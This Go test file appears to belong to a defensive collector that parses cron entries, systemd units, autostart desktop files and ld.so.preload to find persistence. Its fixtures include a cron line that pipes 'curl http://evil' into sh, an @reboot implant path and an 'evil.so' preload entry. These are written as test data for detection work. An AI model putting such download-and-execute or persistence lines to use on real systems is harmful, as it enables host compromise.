package collector

import "testing"

func TestParseCronLineSystem(t *testing.T) {
	// System crontab: 5 time fields + user + command.
	e, ok := parseCronLine("17 *  * * *   root    cd / && run-parts /etc/cron.hourly", true)
	if !ok {
		t.Fatal("expected a parse")
	}
	if e.Schedule != "17 * * * *" || e.User != "root" {
		t.Errorf("sched/user = %q / %q", e.Schedule, e.User)
	}
	if e.Command != "cd / && run-parts /etc/cron.hourly" {
		t.Errorf("command = %q", e.Command)
	}
	// @reboot macro with a user.
	e, ok = parseCronLine("@reboot root /tmp/.x/implant", true)
	if !ok || e.Schedule != "@reboot" || e.User != "root" || e.Command != "/tmp/.x/implant" {
		t.Errorf("reboot macro = %+v ok=%v", e, ok)
	}
	// Comments, blanks and env assignments are not entries.
	for _, line := range []string{"# a comment", "", "PATH=/usr/bin:/bin", "SHELL=/bin/sh"} {
		if _, ok := parseCronLine(line, true); ok {
			t.Errorf("%q should not parse as a cron entry", line)
		}
	}
}

func TestParseCronLineUser(t *testing.T) {
	e, ok := parseCronLine("*/5 * * * * curl http://evil|sh", false)
	if !ok || e.User != "" || e.Command != "curl http://evil|sh" {
		t.Errorf("user crontab entry = %+v ok=%v", e, ok)
	}
}

func TestParseUnitExecStarts(t *testing.T) {
	unit := []byte("[Unit]\nDescription=x\n[Service]\nExecStartPre=-/bin/rm -f /run/x\nExecStart=/usr/bin/foo --flag\nExecStart=@/tmp/.hidden/bar baz\n[Install]\nWantedBy=multi-user.target\n")
	ex := parseUnitExecStarts(unit)
	if len(ex) != 3 {
		t.Fatalf("got %d exec lines: %v", len(ex), ex)
	}
	if ex[0] != "/bin/rm -f /run/x" { // leading '-' stripped
		t.Errorf("ExecStartPre = %q", ex[0])
	}
	if ex[2] != "/tmp/.hidden/bar baz" { // leading '@' stripped
		t.Errorf("ExecStart = %q", ex[2])
	}
}

func TestParseDesktopFile(t *testing.T) {
	d := parseDesktopFile([]byte("[Desktop Entry]\nType=Application\nExec=/home/u/.config/x.sh\nHidden=false\n"))
	if d.Exec != "/home/u/.config/x.sh" || d.Hidden {
		t.Errorf("desktop = %+v", d)
	}
	d = parseDesktopFile([]byte("[Desktop Entry]\nExec=/usr/bin/thing\nX-GNOME-Autostart-enabled=false\n"))
	if !d.Hidden {
		t.Error("X-GNOME-Autostart-enabled=false should mark hidden")
	}
}

func TestFirstProgram(t *testing.T) {
	if got := firstProgram("/usr/bin/foo --flag x"); got != "/usr/bin/foo" {
		t.Errorf("firstProgram = %q", got)
	}
	if got := firstProgram("sudo FOO=bar /tmp/x"); got != "/tmp/x" {
		t.Errorf("firstProgram with wrapper/env = %q", got)
	}
}

func TestParseLdPreload(t *testing.T) {
	data := []byte("# disabled for now: /lib/evil.so\n/usr/lib/libgood.so\n/opt/a.so:/opt/b.so  # trailing note\n\t/opt/c.so\n")
	got := parseLdPreload(data)
	want := []string{"/usr/lib/libgood.so", "/opt/a.so", "/opt/b.so", "/opt/c.so"}
	if len(got) != len(want) {
		t.Fatalf("got %q, want %q", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("got %q, want %q", got, want)
		}
	}
	if got := parseLdPreload([]byte("# only a comment\n\n")); len(got) != 0 {
		t.Fatalf("a comment-only file names no libraries, got %q", got)
	}
}

func TestFirstProgramQuoted(t *testing.T) {
	cases := map[string]string{
		`"/opt/my app/run" --flag`:   `/opt/my`, // a quoted path with a space still yields its first word
		`'/tmp/.x/payload' -d`:       "/tmp/.x/payload",
		`env FOO=1 /usr/bin/python3`: "/usr/bin/python3",
		`"" /bin/true`:               "/bin/true",
	}
	for in, want := range cases {
		if got := firstProgram(in); got != want {
			t.Errorf("firstProgram(%q) = %q, want %q", in, got, want)
		}
	}
}
